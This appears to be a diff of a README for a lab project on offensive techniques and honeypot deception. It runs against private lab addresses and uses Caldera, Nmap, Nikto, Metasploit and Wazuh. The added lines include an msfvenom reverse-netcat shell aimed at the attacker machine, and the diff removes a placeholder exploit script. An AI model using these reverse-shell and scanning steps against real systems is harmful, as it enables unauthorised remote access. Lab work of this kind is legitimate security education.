@@ -13,7 +13,6 @@ This project demonstrates offensive security techniques, cyber deception using h
 
 ## Phase 1: Setup and Compromise the Service
 
-### Victim Environment (Target: `192.168.56.105`)
 1. **Install Apache HTTP Server**:
     ```bash
     sudo apt update && sudo apt install apache2 -y
@@ -27,21 +26,21 @@ This project demonstrates offensive security techniques, cyber deception using h
 
 ---
 
-### Attacker Environment (my Machine: `192.168.56.103`)
+### Attacker Environment (My Machine: `192.168.56.103`)
 
 #### Install and Configure Caldera
-1. Clone the repository:
+1. Install dependencies:
     ```bash
-    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash –
-    sudo apt install -y nodejs
-    node -v
-    npm -v
+    sudo apt install git -y
+    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+    sudo apt install -y nodejs python3 python3-pip
     wget https://go.dev/dl/go1.19.13.linux-amd64.tar.gz
     sudo tar -C /usr/local -xzf go1.19.13.linux-amd64.tar.gz
     echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
     source ~/.profile
-    go version
-    sudo apt install python3 python3-pip -y
+    ```
+2. Clone Caldera:
+    ```bash
     git clone https://github.com/mitre/caldera.git --recursive
     cd caldera
     python3 -m venv venv
@@ -49,13 +48,13 @@ This project demonstrates offensive security techniques, cyber deception using h
     pip install -r requirements.txt
     python3 server.py --insecure --build
     ```
-    
-2. Access Caldera: [http://192.168.56.103:8888](http://192.168.56.103:8888).
+3. Access Caldera: [http://192.168.56.103:8888](http://192.168.56.103:8888).
 
 #### Use Kali Linux Tools
 1. **Nmap (Service Scanning)**:
     ```bash
     nmap -sV -p 80 192.168.56.105
+    nmap --script vuln -p80 192.168.56.105
     ```
 2. **Nikto (HTTP Vulnerability Scanning)**:
     ```bash
@@ -67,18 +66,6 @@ This project demonstrates offensive security techniques, cyber deception using h
     use auxiliary/scanner/http/http_version
     set RHOSTS 192.168.56.105
     run
-    ```
-
-#### Custom Exploitation Script
-- Example Python Script:
-    ```python
-    import requests
-
-    url = "http://192.168.56.105/vulnerable-endpoint"
-    payload = {"command": "malicious_code"}
-    response = requests.post(url, data=payload)
-
-    print(response.text)
     ```
 
 ---
@@ -113,18 +100,11 @@ This project demonstrates offensive security techniques, cyber deception using h
 
 ### Replicate Attacks
 1. Repeat all tools and scripts used in Phase 1 on both honeypots.
-2. Compare results for realism and accuracy.
-
----
-
-### Evaluate Realism
-1. Monitor resource usage:
+2. Use **msfvenom** to create a reverse shell:
     ```bash
-    top
-    ```
-2. Analyze honeypot logs:
-    ```bash
-    tail -f /path/to/honeypot/logs
+    msfvenom -p cmd/unix/reverse_netcat lhost=192.168.56.103 lport=4444 -f raw > shell.sh
+    chmod +x shell.sh
+    ./shell.sh
     ```
 
 ---
@@ -168,7 +148,7 @@ This project demonstrates offensive security techniques, cyber deception using h
 
 ### Visualize Logs and Insights
 1. Access Wazuh dashboard: [http://192.168.56.103:5601](http://192.168.56.103:5601).
-2. Compare logs and visualize key metrics for victim and honeypot activity.
+2. Analyze logs for attack patterns, brute-force attempts, and visualizations.
 
 
 ---
